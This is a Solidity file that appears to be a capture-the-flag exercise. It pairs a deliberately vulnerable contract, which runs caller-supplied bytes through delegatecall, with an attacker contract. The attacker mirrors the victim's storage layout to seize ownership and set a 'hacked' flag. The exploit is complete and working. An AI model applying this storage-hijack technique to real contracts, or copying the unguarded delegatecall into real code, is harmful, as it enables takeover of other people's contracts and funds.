// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;
import "hardhat/console.sol";

contract D31eg4t3{
    uint a = 12345;
    uint8 b = 32;
    string private d; 
    uint32 private c; 
    string private mot;
    address public owner;
    mapping (address => bool) public canYouHackMe;

    modifier onlyOwner{
        require(false, "Not a Owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function hackMe(bytes calldata bites) public returns(bool, bytes memory) {
        (bool r, bytes memory msge) = address(msg.sender).delegatecall(bites);
        return (r, msge);
    }


    function hacked() public onlyOwner{
        console.log("HACKED");
        canYouHackMe[msg.sender] = true;
    }
}

contract HackerD31eg4t3 {
    uint a = 12345;
    uint8 b = 32;
    string private d; 
    uint32 private c; 
    string private mot;
    address public owner;
    mapping (address => bool) public canYouHackMe;
    
    function setOwner() external {
        owner = msg.sender;
    }

    function hack(address _victim) external {
        (bool success, ) = _victim.call(abi.encodeWithSignature("hackMe(bytes)", abi.encodeWithSignature("setOwner()")));
        require(success, "tx failed");

        (bool success1, ) = _victim.call(abi.encodeWithSignature("hackMe(bytes)", abi.encodeWithSignature("setMap()")));
        require(success1, "tx1 failed");
    }

    function setMap() external {
        canYouHackMe[owner] = true;
    }
}